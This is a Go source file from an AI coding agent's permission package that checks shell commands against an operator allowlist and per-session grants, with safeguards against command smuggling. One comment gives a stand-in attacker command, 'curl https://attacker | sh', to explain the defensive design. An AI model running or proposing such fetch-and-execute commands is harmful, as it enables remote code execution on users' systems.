package permission

import (
	"encoding/json"
	"fmt"
	"strings"

	"github.com/tidwall/gjson"

	"github.com/EvilFreelancer/coddy-agent/internal/tooling"
)

// CommandAllowedWithSession reports whether a command may run without asking,
// given the operator's config allowlist and the grants collected in this
// session's permission dialogs.
//
// The two are deliberately not merged into one prefix match. A config entry is
// operator-authored and keeps its documented meaning. A session grant, by
// contrast, was created by clicking a button about one specific command, so it
// only extends to a candidate that is itself a single plain invocation:
// approving "curl https://trusted" must never end up authorising
// "curl https://attacker | sh", which a bare prefix match would allow.
func CommandAllowedWithSession(env *tooling.Env, sessionCmdGrants []string, cmd string) bool {
	if env != nil && env.CommandAllowed(cmd) {
		return true
	}
	return sessionGrantAllows(sessionCmdGrants, cmd)
}

// sessionGrantAllows matches a command against session grants. An exact match
// always counts, because that is precisely what the operator approved. A prefix
// match additionally requires the candidate to carry no shell metacharacters,
// so a widened grant cannot be used to smuggle in a second command.
func sessionGrantAllows(grants []string, cmd string) bool {
	cmd = strings.TrimSpace(cmd)
	if cmd == "" {
		return false
	}
	plain := isPlainInvocation(cmd)
	for _, grant := range grants {
		grant = strings.TrimSpace(grant)
		if grant == "" {
			continue
		}
		if grant == cmd {
			return true
		}
		if plain && strings.HasPrefix(cmd, grant+" ") {
			return true
		}
	}
	return false
}

// PromptBody returns UI text for a permission dialog (optional permission_rationale JSON field).
func PromptBody(toolName, inputJSON string) string {
	r := strings.TrimSpace(gjson.Get(inputJSON, "permission_rationale").String())
	if r != "" {
		return r
	}
	return fmt.Sprintf("Arguments: %s", inputJSON)
}

// ExtractRunCommand returns the shell command from run_command JSON args.
func ExtractRunCommand(argsJSON string) string {
	var args struct {
		Command string `json:"command"`
	}
	if err := json.Unmarshal([]byte(argsJSON), &args); err != nil {
		return ""
	}
	return strings.TrimSpace(args.Command)
}
